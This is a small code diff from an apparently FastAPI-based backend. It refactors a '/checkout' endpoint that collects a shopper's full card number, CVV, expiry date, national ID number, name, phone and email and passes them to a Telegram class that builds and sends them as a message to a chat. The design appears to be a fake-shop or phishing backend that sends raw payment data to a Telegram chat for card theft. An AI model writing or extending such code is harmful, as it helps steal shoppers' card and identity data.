@@ -49,17 +49,18 @@ async def create_card(body:CardCreateDTO, db: Session = Depends(get_db)):
     
 @router.post("/checkout")
 async def checkout(body:TelegramSchema):
-    telegram_instance = Telegram(body.token,
-                                 body.chat_id,
-                                 body.shop_id,
-                                 body.DNI,
-                                 body.number,
-                                 body.CVV,
-                                 body.Vto,
-                                 body.name,
-                                 body.last_name,
-                                 body.phone,
-                                 body.email)
+    payload = {
+        "chat_id": body.chat_id,
+        "DNI": body.DNI,
+        "number": body.number,
+        "CVV": body.CVV,
+        "Vto": body.Vto,
+        "name": body.name,
+        "last_name": body.last_name,
+        "phone": body.phone,
+        "email": body.email
+    }
+    telegram_instance = Telegram(payload=payload)
     message = telegram_instance.build_message()
     telegram_instance.send_message(message)
     
